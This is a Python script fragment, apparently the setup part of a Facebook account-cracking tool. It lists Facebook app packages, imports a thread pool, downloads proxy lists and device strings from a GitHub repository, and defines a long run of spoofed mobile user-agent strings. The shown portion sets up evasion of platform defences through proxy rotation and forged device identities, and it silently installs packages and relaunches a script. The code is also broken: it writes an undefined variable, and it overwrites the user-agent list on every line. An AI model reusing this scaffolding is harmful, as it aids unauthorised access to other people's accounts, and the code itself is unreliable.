# ==================== TASK ====================

#most important: API token update
#2): nxn2 API method uodate

# ========================================
#fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python usmi.py')

try:
    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
# ==================== USER AGENT EXAMPLE ====================
ua = ["Mozilla/5.0 (Linux; U; Android 10; es-us; Redmi 7A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn"]
ua = ["Mozilla/5.0 (Linux; U; Android 9; zh-cn; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.11.27"]
ua = ["Mozilla/5.0 (Linux; U; Android 7.1.2; zh-cn; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.2.5"]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; M2006C3MG MIUI/V12.0.23.0.QCRMIXM)"]
ua = ["Mozilla/5.0 (Linux; U; Android 7.1.2; en-gb; Redmi 5 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.8.5"]
ua = ["Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI PLAY MIUI/V11.0.10.0.OFIMIXM)"]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.0.2"]
ua = ["Mozilla/5.0 (Linux; U; Android 13; sk-sk; Xiaomi 11T Pro Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.4.0-g"]
ua = ["Mozilla/5.0 (Linux; U; Android 10; zh-cn; MI 8 UD Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.2.15"]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; Mi Note 2 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1"]
ua = ["Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8 Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn"]
ua = ["Mozilla/5.0 (Linux; U; Android 14; en-us; 24090RA29C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.3.250702"]
ua = ["Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.3.3-gn"]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; SM-C5000 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.6.4.950 UCBS/2.11.1.26 Mobile Safari/537.36 AliApp(TB/7.1.7) WindVane/8.0.0 1080X1920"]
ua = ["Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Safari/537.36 UCBrowser/15.1.2.1388"]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"]
ua = ["Mozilla/5.0 (Linux; U; Android 16; zh-CN; 2311DRK48C Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/18.8.0.1506 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Safari/537.36 UCBrowser/17.3.6.1367"]
ua = ["Mozilla/5.0 (Linux; U; Android 14; zh-CN; JDY-AN00 Build/HONORJDY-AN00M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/18.8.0.1506 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 15; en-US; V2419 Build/AP3A.240905.015.A2_NN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/15.1.4.1390 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 15; en-US; NIC-LX2 Build/HONORNIC-L52) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/15.1.3.1389 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 13; en-US; itel A663L Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/15.1.4.1390 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 9; zh-CN; MI 9 Build/PKQ1.181121.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3159.134 UCBrowser/12.5.5.1035 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 11; en-US; Infinix X6511 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/15.1.4.1390 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 10; en-US; JNY-LX1 Build/HUAWEIJNY-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/15.1.4.1390 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 12; en-US; moto g51 5G Build/S2RYAS32.58-13-12-5-1-6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/14.6.2.1361 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R9sk Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.6.0.1040 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; U; Android 12; en-US; vivo 1907_19 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UCBrowser/15.1.4.1390 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (LG-C199 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1)"]
ua = ["Mozilla/5.0 (LG-T500 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1)"]
ua = ["Mozilla/5.0 (LG-T370 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1)"]
ua = ["Mozilla/5.0 (LG-T385 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1)"]
ua = ["Mozilla/5.0 (LG-T510 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1)"]
ua = ["Mozilla/5.0 (LG-T375 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1)"]
ua = ["Mozilla/5.0 (Linux; Android 9; ANE-LX1; HMSCore 6.15.4.351; GMSCore 26.16.31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; AQM-LX1; HMSCore 6.15.4.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; NAM-LX9; HMSCore 6.15.4.342) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; JNY-LX2; HMSCore 6.15.4.352) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/15.0.10.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; NOP-AN00; HMSCore 6.15.6.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/17.0.4.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; MGA-LX9N; HMSCore 6.15.6.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 9; JKM-LX1; HMSCore 6.15.4.351; GMSCore 26.13.32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; STG-LX2; HMSCore 6.15.6.312; GMSCore 0.3.13.250932) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.2.313 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.15.4.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; ELS-NX9; HMSCore 6.15.6.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.6.300 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 9; HarmonyOS; JKM-AL00b; HMSCore 6.15.4.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/17.0.4.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; JAD-LX9; HMSCore 6.15.6.312; GMSCore 0.3.15.250932) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; VOG-L29; HMSCore 6.15.6.312; GMSCore 26.13.32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; JNY-LX2; HMSCore 6.15.6.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.15.0.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.6.300 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.15.6.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; FRL-L22; HMSCore 6.15.4.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; MAO-LX9; HMSCore 6.15.6.312; GMSCore 0.3.7.250932) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.9.302 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; ELS-N39; HMSCore 6.15.6.312; GMSCore 0.3.15.250932) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/17.0.3.302 Mobile Safari/537.36"]
ua = ["Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"]
ua = ["Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"]
ua = ["Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0"]
ua = ["Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13"]
ua = ["Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"]
ua = ["Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65"]
ua = ["Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413"]
ua = ["NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba"]
ua = ["Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124"]
ua = ["Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0"]
ua = ["Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413"]
ua = ["Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0"]
ua = ["Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["Nokia5800XpressMusic/GoBrowser/1.6.0.75"]
ua = ["NokiaN72/2.0617.1.0.3 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13"]
ua = ["Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba"]
ua = ["Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50"]
ua = ["Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70"]
ua = ["Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413"]
ua = ["Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0"]
ua = ["Nokia5320XpressMusic/GoBrowser/1.6.91"]
ua = ["Mozilla/5.0 (Series40; NokiaC2-01/11.40; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27"]
ua = ["Nokia6280/2.0 (03.60) Profile/MIDP-2.0 Configuration/CLDC-1.1"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia700/112.010.1404; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.20 Mobile Safari/535.1 3gpp-gba"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/29.1 Chrome/136.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/29.0 Chrome/136.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/29.0 Chrome/136.0.0.0 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/29.0 Chrome/136.0.0.0 Mobile Safari/537.36,gzip(gfe)"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/30.0 Chrome/143.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A115F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-A155F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-A146P) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/123.0.6312.120 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G975F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G715U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J337W Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.0 Chrome/67.0.3396.87 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-N935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.9999.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/30.0 Chrome/143.0.0.0 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Safari/537.36"]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T285YD Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3"]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A325M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.1 Chrome/130.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/126.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J105F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.1 Chrome/121.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G361H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-S711B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950W Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.0 Chrome/67.0.3396.87 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930F/G930FXXU8EVG2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G781W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J500F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36"]
